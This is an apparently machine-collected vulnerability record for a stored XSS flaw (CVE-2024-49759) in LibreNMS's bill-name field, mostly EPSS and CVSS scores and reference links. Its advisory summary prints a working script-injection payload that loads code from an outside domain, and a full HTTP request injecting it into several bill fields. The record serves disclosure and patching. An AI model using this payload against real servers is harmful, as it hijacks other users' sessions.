vulnerability_id: VCID-yzqp-k8ma-ekg2
aliases:
  - CVE-2024-49759
  - GHSA-888j-pjqh-fx58
summary: |
  Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/edituser.inc.php
  ### Summary
  A Stored Cross-Site Scripting (XSS) vulnerability in the "Manage User Access" page allows authenticated users to inject arbitrary JavaScript through the "bill_name" parameter when creating a new bill. This vulnerability can lead to the execution of malicious code when visiting the "Bill Access" dropdown in the user's "Manage Access" page, potentially compromising user sessions and allowing unauthorized actions.

  ### Details
  When creating a new bill, an attacker can inject the following XSS payload into the "bill_name" parameter:
  ```test1'"><script/src=//15.rs>```

  Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

  The payload triggers in the "Bill Access" dropdown when the user's "Manage Access" page is visited. The sink responsible for this issue is:
  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/edituser.inc.php#L309

  ### PoC
  1. Create a new bill using the following payload in the "bill_name" parameter:
  ```test1'"><script/src=//15.rs>```
  2. Save the bill.
  3. Navigate to the "Manage Access" page for the user.
  4. Observe that the injected script executes in the "Bill Access" dropdown.

  Example Request:
  ```http
  POST /bill/bill_id=2/view=edit/ HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded
  Cookie: <your_cookie>

  _token=<your_token>&action=update_bill&bill_name=test1%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_type=cdr&bill_cdr=&bill_cdr_type=Kbps&dir_95th=in&bill_quota=&bill_quota_type=MB&bill_day=1&bill_custid=test2%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_ref=test3%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_notes=test4%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&Submit=Save
  ```

  ### Impact

  This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Manage Access" page. The attacker can perform unauthorized actions or compromise user accounts by exploiting this vulnerability.
severities:
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.0055'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00538'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00543'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00547'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00554'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00553'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00551'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00545'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.0054'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00536'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00531'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00011'
    scoring_system: epss
    scoring_elements: '0.00704'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10184'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10278'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15917'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15421'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15486'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15477'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15487'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15531'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15605'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15865'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.16010'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15610'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15638'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15934'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: 2e-05
    scoring_system: epss
    scoring_elements: '0.00056'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: 2e-05
    scoring_system: epss
    scoring_elements: '0.00055'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: 2e-05
    scoring_system: epss
    scoring_elements: '0.00054'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: 3e-05
    scoring_system: epss
    scoring_elements: '0.00104'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: 3e-05
    scoring_system: epss
    scoring_elements: '0.00105'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: 9e-05
    scoring_system: epss
    scoring_elements: '0.00316'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-888j-pjqh-fx58
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms
  - score: '4.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-15T16:52:28Z/
    published_at: None
    url: https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0
  - score: '4.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-15T16:52:28Z/
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58
  - score: '5.4'
    scoring_system: cvssv3
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49759
  - score: '5.4'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49759
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49759
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49759
weaknesses:
  - CWE-79
  - CWE-937
  - CWE-1035
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-49759
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-49759
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
  - url: https://github.com/advisories/GHSA-888j-pjqh-fx58
    reference_type:
    reference_id: GHSA-888j-pjqh-fx58
